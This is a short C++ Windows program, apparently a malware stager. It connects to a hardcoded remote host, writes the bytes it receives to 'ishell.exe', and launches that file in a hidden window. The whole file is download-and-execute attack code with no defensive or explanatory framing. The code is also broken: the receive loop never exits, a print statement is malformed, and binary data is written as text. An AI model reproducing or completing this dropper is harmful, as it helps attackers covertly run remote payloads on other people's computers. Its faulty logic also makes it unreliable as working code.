#include <iostream>
#include <fstream>
#include <winsock2.h>
using namespace std;

int main(){

	char HOST[256] = "10.230.229.13";
	int PORT = 8000;
	
	WSADATA wsaData;
	int starterr = WSAStartup(MAKEWORD(2,2), &wsaData);
	if (starterr != 0) {
		printf("Start Error");
		WSACleanup();
		return 0;
	}

	SOCKET c = socket(AF_INET, SOCK_STREAM, 0);
	if (c == INVALID_SOCKET) {
		printf("Invalid Socket");
		WSACleanup();
		return 0;
	}

	sockaddr_in a;
	a.sin_port = htons(PORT);
	a.sin_addr.s_addr = inet_addr(HOST);
	a.sin_family = AF_INET;

	if (connect(c, (sockaddr*)&a, sizeof(a)) == SOCKET_ERROR) {
		printf("Socket Error");
		WSACleanup();
		return 0;
	}
	
	//char sbuf[16] = "Connected.";
	//send(c, sbuf, sizeof(sbuf), 0);

	char buf[1024];
	ofstream file("ishell.exe");
	int res;

	do{
		res = recv(c, buf, sizeof(buf), 0);
		printf("Received %s bytes") %
		file << buf;
		
	} while (1 == 1);
	
	file.close();
	
	ShellExecute(NULL, "open", "ishell.exe", NULL, NULL, SW_HIDE);
}	
